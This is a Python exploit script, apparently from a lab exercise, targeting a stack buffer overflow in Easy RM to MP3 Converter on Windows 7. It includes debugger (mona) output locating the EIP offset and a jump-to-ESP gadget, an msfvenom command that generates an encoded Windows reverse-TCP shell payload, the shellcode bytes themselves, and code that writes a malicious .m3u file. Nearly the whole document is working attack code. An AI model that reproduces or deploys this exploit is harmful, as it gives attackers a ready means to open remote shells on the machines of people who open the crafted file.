'''
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
'''
#Log data, item 8
#Address=0BADF00D
#Message= - Pattern {Ld} (0x7D644C7B) found in cyclic pattern at position 26084

#A test confirms EIP overwrite

'''
!mona modules
Run #1
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Module info :
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    0x10000000 | 0x10071000 | 0x00071000 | False  | False   | False |  False   | False  | -1.0- [MSRMfilter03.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter03.dll)
0BADF00D    0x03eb0000 | 0x03f21000 | 0x00071000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec00.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMCcodec00.dll)
0BADF00D    0x04030000 | 0x044fd000 | 0x004cd000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec02.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMCcodec02.dll)
0BADF00D    0x03f90000 | 0x03fa0000 | 0x00010000 | True   | False   | False |  False   | False  | -1.0- [MSRMfilter02.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter02.dll)
0BADF00D    0x02020000 | 0x020bf000 | 0x0009f000 | True   | False   | False |  False   | False  | -1.0- [MSRMfilter01.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter01.dll)
0BADF00D    0x01e40000 | 0x01e47000 | 0x00007000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec01.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMCcodec01.dll)
0BADF00D    0x03f70000 | 0x03f8e000 | 0x0001e000 | True   | False   | False |  False   | False  | 1.0.1.8 [wmatimer.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\wmatimer.dll)
0BADF00D    0x00400000 | 0x004be000 | 0x000be000 | False  | False   | False |  False   | False  | 2.7.3.700 [RM2MP3Converter.exe] (C:\Program Files (x86)\Easy RM to MP3 Converter\RM2MP3Converter.exe)
0BADF00D    0x03fe0000 | 0x03ff2000 | 0x00012000 | True   | False   | False |  False   | False  | -1.0- [MSLog.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSLog.dll)
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
Run #2

0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Module info :
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    0x10000000 | 0x10071000 | 0x00071000 | False  | False   | False |  False   | False  | -1.0- [MSRMfilter03.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter03.dll)
0BADF00D    0x02320000 | 0x02391000 | 0x00071000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec00.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMCcodec00.dll)
0BADF00D    0x04010000 | 0x044dd000 | 0x004cd000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec02.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMCcodec02.dll)
0BADF00D    0x00900000 | 0x00910000 | 0x00010000 | True   | False   | False |  False   | False  | -1.0- [MSRMfilter02.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter02.dll)
0BADF00D    0x01f50000 | 0x01fef000 | 0x0009f000 | True   | False   | False |  False   | False  | -1.0- [MSRMfilter01.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter01.dll)
0BADF00D    0x00300000 | 0x00307000 | 0x00007000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec01.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMCcodec01.dll)
0BADF00D    0x003e0000 | 0x003fe000 | 0x0001e000 | True   | False   | False |  False   | False  | 1.0.1.8 [wmatimer.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\wmatimer.dll)
0BADF00D    0x00400000 | 0x004be000 | 0x000be000 | False  | False   | False |  False   | False  | 2.7.3.700 [RM2MP3Converter.exe] (C:\Program Files (x86)\Easy RM to MP3 Converter\RM2MP3Converter.exe)
0BADF00D    0x021c0000 | 0x021d2000 | 0x00012000 | True   | False   | False |  False   | False  | -1.0- [MSLog.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSLog.dll)
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------

0BADF00D   !mona jmp -r esp -m MSRMfilter03.dll

           ---------- Mona command started on 2018-04-30 18:11:05 (v2.0, rev 582) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Only querying modules MSRMfilter03.dll
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 1 modules
0BADF00D       - Querying module MSRMfilter03.dll
70C70000   Modules C:\Windows\SysWOW64\actxprxy.dll
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile jmp.txt
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'push esp # ret ' : 1
0BADF00D   [+] Results :
1001B058     0x1001b058 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter03.dll)
0BADF00D       Found a total of 1 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:04.087000

There's no null byte in this address so we're fine to use it

'''

import struct

address = 0x1001b058
p_address = struct.pack('<L', address)

#badchars 
#\x00, \xff, \x09, \x0a
'''
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -e x86/shikata_ga_nai -b \x00,\xff,\xf09,\x0a -f python 
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1684 bytes
'''

buf =  ""
buf += "\xd9\xec\xb8\x43\xa2\x72\x1e\xd9\x74\x24\xf4\x5d\x2b"
buf += "\xc9\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\x06\xb1\x90"
buf += "\xeb\x74\x5d\xd6\x14\x84\x9e\xb7\x9d\x61\xaf\xf7\xfa"
buf += "\xe2\x80\xc7\x89\xa6\x2c\xa3\xdc\x52\xa6\xc1\xc8\x55"
buf += "\x0f\x6f\x2f\x58\x90\xdc\x13\xfb\x12\x1f\x40\xdb\x2b"
buf += "\xd0\x95\x1a\x6b\x0d\x57\x4e\x24\x59\xca\x7e\x41\x17"
buf += "\xd7\xf5\x19\xb9\x5f\xea\xea\xb8\x4e\xbd\x61\xe3\x50"
buf += "\x3c\xa5\x9f\xd8\x26\xaa\x9a\x93\xdd\x18\x50\x22\x37"
buf += "\x51\x99\x89\x76\x5d\x68\xd3\xbf\x5a\x93\xa6\xc9\x98"
buf += "\x2e\xb1\x0e\xe2\xf4\x34\x94\x44\x7e\xee\x70\x74\x53"
buf += "\x69\xf3\x7a\x18\xfd\x5b\x9f\x9f\xd2\xd0\x9b\x14\xd5"
buf += "\x36\x2a\x6e\xf2\x92\x76\x34\x9b\x83\xd2\x9b\xa4\xd3"
buf += "\xbc\x44\x01\x98\x51\x90\x38\xc3\x3d\x55\x71\xfb\xbd"
buf += "\xf1\x02\x88\x8f\x5e\xb9\x06\xbc\x17\x67\xd1\xc3\x0d"
buf += "\xdf\x4d\x3a\xae\x20\x44\xf9\xfa\x70\xfe\x28\x83\x1a"
buf += "\xfe\xd5\x56\x8c\xae\x79\x09\x6d\x1e\x3a\xf9\x05\x74"
buf += "\xb5\x26\x35\x77\x1f\x4f\xdc\x82\xc8\x0f\x21\x8c\x09"
buf += "\x98\x23\x8c\x08\xe3\xad\x6a\x60\x03\xf8\x25\x1d\xba"
buf += "\xa1\xbd\xbc\x43\x7c\xb8\xff\xc8\x73\x3d\xb1\x38\xf9"
buf += "\x2d\x26\xc9\xb4\x0f\xe1\xd6\x62\x27\x6d\x44\xe9\xb7"
buf += "\xf8\x75\xa6\xe0\xad\x48\xbf\x64\x40\xf2\x69\x9a\x99"
buf += "\x62\x51\x1e\x46\x57\x5c\x9f\x0b\xe3\x7a\x8f\xd5\xec"
buf += "\xc6\xfb\x89\xba\x90\x55\x6c\x15\x53\x0f\x26\xca\x3d"
buf += "\xc7\xbf\x20\xfe\x91\xbf\x6c\x88\x7d\x71\xd9\xcd\x82"
buf += "\xbe\x8d\xd9\xfb\xa2\x2d\x25\xd6\x66\x5d\x6c\x7a\xce"
buf += "\xf6\x29\xef\x52\x9b\xc9\xda\x91\xa2\x49\xee\x69\x51"
buf += "\x51\x9b\x6c\x1d\xd5\x70\x1d\x0e\xb0\x76\xb2\x2f\x91"


with open('crash.m3u', 'wb') as crashfile:
	crashfile.write('A'*26084+p_address+'\x90'*50+buf)
